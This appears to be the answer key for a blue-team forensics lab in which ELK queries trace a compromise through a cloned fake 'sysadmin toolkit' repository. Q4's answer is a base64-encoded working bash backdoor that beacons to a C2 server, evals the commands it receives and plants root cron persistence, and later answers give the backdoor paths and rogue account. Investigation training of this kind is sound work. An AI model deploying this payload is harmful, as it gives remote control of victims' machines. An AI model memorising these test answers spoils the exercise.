## Q1: Identify the hostname and IP address of the compromised system.


**Fortamt:** hostname_IP
**Answer:** elk-siem_84.247.162.93

**Query Chain:**
```
Step 1: Find any log entry
*

Step 2: Look at available fields
Check: agent.hostname, host.name, host.ip fields in any document
```

---

## Q2: A malicious repository was cloned onto the system. What is the full GitHub URL?


**Fortamt:** Github_link
**Answer:** `https://github.com/qays3/linux-sysadmin-toolkit.git`

**Query Chain:**
```
Step 1: Find git process
process.name:git

Step 2: Filter for clone operations
process.name:git AND process.args:*clone*

Step 3: Examine process.args field for full URL
```

---

## Q3: What is the exact timestamp when the installation script started?

**Fortamt:** YYYY-MM-DD_HH:MM:SS

**Answer:** 2025-11-04_22:01:43

**Query Chain:**
```
Step 1: Find installation script
process.args:*install.sh*

Step 2: Filter for execution (not just arguments)
process.name:bash AND process.args:*install.sh*

Step 3: Sort by @timestamp ascending, take first result
```

---

## Q4: What is the payload that attacker used with the toolkit?

**Fortamt:** base64

**Answer:** `IyEvYmluL2Jhc2gKCmV4ZWMgPiAvZGV2L251bGwgMj4mMQoKX19oPSIkKGhvc3RuYW1lKSIKX19pPSIkKGlwIGEgMj4vZGV2L251bGwgfCBncmVwIGluZXQgfCBhd2sgJ3twcmludCAkMn0nIHwgaGVhZCAtMSkiCl9fdT0iJCh3aG9hbWkpIgpfX3VpZD0iJChpZCAtdSkiCl9faz0iJCh1bmFtZSAtYSkiCgpfX2MyPSI4NC4yNDcuMTI5LjEyMCIKX19wPSI0NDQ0IgoKd2hpbGUgdHJ1ZTsgZG8KICAgIF9fZD0iJChkYXRlICslcykiCiAgICBfX2lkPSIkKGhvc3RuYW1lIC1zKS0kX19kIgogICAgCiAgICBfX289JChjdXJsIC1zIC1YIFBPU1QgXAogICAgICAgIC1IICJYLUJlYWNvbjogJF9faWQiIFwKICAgICAgICAtSCAiWC1Ib3N0OiAkX19oIiBcCiAgICAgICAgLUggIlgtVXNlcjogJF9fdSIgXAogICAgICAgIC1IICJYLVVJRDogJF9fdWlkIiBcCiAgICAgICAgLUggIlgtSVA6ICRfX2kiIFwKICAgICAgICAtSCAiWC1PUzogJF9fayIgXAogICAgICAgIC0tbWF4LXRpbWUgMTAgXAogICAgICAgICJodHRwOi8vJHtfX2MyfToke19fcH0vIiAyPi9kZXYvbnVsbCkKICAgIAogICAgaWYgWyAtbiAiJF9fbyIgXTsgdGhlbgogICAgICAgIGV2YWwgIiRfX28iIDI+L2Rldi9udWxsCiAgICBmaQogICAgCiAgICBzbGVlcCAzMDAKICAgIAogICAgaWYgWyAkKCgkKGRhdGUgKyVzKSAlIDg2NDAwKSkgLWx0IDMwMCBdOyB0aGVuCiAgICAgICAgX19jcj0iKi81ICogKiAqICogcm9vdCAvdXNyL2xvY2FsL2Jpbi8uc3lzdXBkID4vZGV2L251bGwgMj4mMSIKICAgICAgICBpZiAhIGdyZXAgLXEgIi5zeXN1cGQiIC9ldGMvY3JvbnRhYiAyPi9kZXYvbnVsbDsgdGhlbgogICAgICAgICAgICBlY2hvICIkX19jciIgPj4gL2V0Yy9jcm9udGFiCiAgICAgICAgICAgIHN5c3RlbWN0bCByZXN0YXJ0IGNyb24gMj4vZGV2L251bGwKICAgICAgICBmaQogICAgZmkKZG9uZQo=`

**Query Chain:**
```
First we get the github repo and check which file have the payload, and its the health-check, and you can see the base64

```

---

## Q5: What is the full path of the temporary file created?


**Fortamt:** /path/file

**Answer:** `/tmp/.sys_check`

**Query Chain:**
```
Look for temporary directory operations
file.path:/tmp/*

```

---

## Q6: What is the absolute path where the backdoor was installed?

**Fortamt:** /path/file

**Answer:** `/usr/local/bin/.sysupd`

**Query Chain:**
```
Search system binary directories
file.path:/usr/local/bin/*

```

---

## Q7: What is the destination IP address and port for C2?

**Fortamt:** IP_PORT

**Answer:** 84.247.129.120_4444

**Query Chain:**
```
Step 1: Find curl processes
process.name:curl

Step 2: Look for POST requests
process.name:curl AND process.args:*POST*

Step 3: Extract IP from process arguments
Look at process.args field for http:// URLs

Step 4: Extract port number
Check process.args for :PORT pattern

IP: `84.247.129.120`, Port: `4444`
```

---

## Q8: Calculate time interval between backdoor deployment and first C2 beacon, ignore the milliseconds.

**Format:** Seconds

**Answer:** 2

**Query Chain:**
```
Step 1: Find backdoor deployment
process.name:cp AND process.args:*.sysupd*
Note @timestamp: 2025-11-04_22:02:00 (T1)

Step 2: Find first curl POST
process.name:curl AND process.args:*POST*
Sort by @timestamp ascending
Note @timestamp: 2025-11-04_22:01:58 (T2)

Step 3: Calculate difference
T1 - T2 = 22:02:00 - 22:01:58
       = 2

```

---

## Q9: What is the username and UID of the backdoor account?

**Format:** username_UID

**Answer:** sysupdate_1337

**Query Chain:**
```
Step 1: Find user creation
process.name:useradd

Step 2: Check for non-standard UIDs
process.args:*-u* AND process.args:*

Step 3: Extract username from process.args
Look for pattern: useradd -m -s /bin/bash -u [UID] [USERNAME]

Step 4: Verify UID
Look for 1337 in process.args
```

---

